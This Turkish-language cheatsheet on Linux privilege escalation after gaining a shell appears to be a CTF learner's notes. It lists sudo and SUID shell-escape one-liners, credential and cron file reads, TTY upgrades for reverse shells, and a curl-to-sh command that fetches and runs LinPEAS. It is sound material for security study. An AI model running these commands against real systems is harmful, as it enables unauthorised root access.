# Linux Privilege Escalation Cheatsheet

Shell aldıktan sonra root olma yolları.

## İlk Refleks — Shell Alınca Sırayla Yap

```bash
# 1. Kim olduğunu öğren
whoami
id

# 2. Sudo ile ne çalıştırabiliyorsun?
sudo -l

# 3. SUID binary'leri bul
find / -perm -u=s -type f 2>/dev/null

# 4. Crontab var mı?
cat /etc/crontab
ls -la /etc/cron*

# 5. Yazılabilir dosyalar
find / -writable -type f 2>/dev/null | grep -v proc

# 6. Kullanıcıları listele
cat /etc/passwd | grep -v nologin

# 7. Kernel versiyonu (exploit ararsın)
uname -a
```

## sudo -l Çıktısına Göre Aksiyon

| sudo -l'de görürsen | Yap |
|---|---|
| `vim` | `sudo vim -c ':!/bin/sh'` |
| `nano` | `sudo nano` → `^R^X` → `reset; sh 1>&0 2>&0` |
| `find` | `sudo find / -exec /bin/sh \;` |
| `python` | `sudo python -c 'import os;os.system("/bin/sh")'` |
| `bash` | `sudo bash` |
| `less/more` | `sudo less /etc/passwd` → `!/bin/sh` |
| `env` | `sudo env /bin/sh` |
| `awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |

**Her zaman GTFOBins'e bak:** https://gtfobins.github.io

## SUID Escalation

```bash
# SUID binary'leri bul
find / -perm -u=s -type f 2>/dev/null

# Tuhaf binary görürsen → GTFOBins'te ara
# Bilinen SUID privesc'ler:
# /usr/bin/python → python -c 'import os;os.execl("/bin/sh","sh","-p")'
# /usr/bin/find  → find . -exec /bin/sh -p \;
```

## TTY Upgrade (önemli — reverse shell sonrası)

```bash
# 1. Python ile TTY al
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2. Background'a at
Ctrl+Z

# 3. Terminal ayarla
stty raw -echo; fg

# 4. Environment
export TERM=xterm
```

## Gerçek Kullanımım

```
# Simple CTF:
sudo -l → (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'
# → root shell!
```

## Otomatik Araçlar

```bash
# LinPEAS (en kapsamlı)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh
```
